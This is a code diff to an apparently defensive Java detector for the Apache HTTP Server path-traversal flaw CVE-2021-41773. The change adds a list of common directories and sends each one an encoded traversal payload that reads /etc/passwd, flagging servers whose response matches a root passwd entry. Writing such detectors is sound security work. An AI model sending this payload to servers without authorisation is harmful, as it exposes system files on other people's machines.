@@ -49,7 +49,33 @@ public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {
   private final Clock utcClock;
   private final HttpClient httpClient;
 
-  private final Pattern vulnerabilityResponsePattern = Pattern.compile("root:[x*]:0:0:");
+  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("root:[x*]:0:0:");
+  private static final ImmutableList<String> COMMON_DIRECTORIES =
+      ImmutableList.of(
+          "admin",
+          "album",
+          "app",
+          "assets",
+          "bin",
+          "console",
+          "css",
+          "cgi-bin",
+          "demo",
+          "doc",
+          "eqx",
+          "files",
+          "fs",
+          "html",
+          "img-sys",
+          "jquery_ui",
+          "js",
+          "media",
+          "public",
+          "static",
+          "tmp",
+          "upload",
+          "xls",
+          "scripts");
 
   @Inject
   ApacheHttpServerCVE202141773VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
@@ -71,24 +97,29 @@ public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
+    for (String dir : COMMON_DIRECTORIES) {
+      if (checkUrlWithCommonDirectory(networkService, dir)) {
+        return true;
+      }
+    }
+    return false;
+  }
+
+  private boolean checkUrlWithCommonDirectory(NetworkService networkService, String directory) {
+    String payload =
+        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd";
     String targetUri =
-        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
-            + "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd";
+        String.format(
+            "%s%s%s",
+            NetworkServiceUtils.buildWebApplicationRootUrl(networkService), directory, payload);
     try {
       HttpResponse response = httpClient.send(get(targetUri).withEmptyHeaders().build(),
           networkService);
-      Optional<String> server = response.headers().get("Server");
       Optional<String> body = response.bodyString();
-      if (server.isPresent() && server.get().contains("Apache/2.4.49")) {
-        // require all denied
-        if (response.status() == HttpStatus.FORBIDDEN && body.isPresent()
-            && body.get().contains("You don't have permission to access this resource.")) {
-          return false;
-        }
-        if (response.status() == HttpStatus.OK && body.isPresent()
-            && vulnerabilityResponsePattern.matcher(body.get()).find()) {
-          return true;
-        }
+      if (response.status() == HttpStatus.OK
+          && body.isPresent()
+          && VULNERABILITY_RESPONSE_PATTERN.matcher(body.get()).find()) {
+        return true;
       }
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
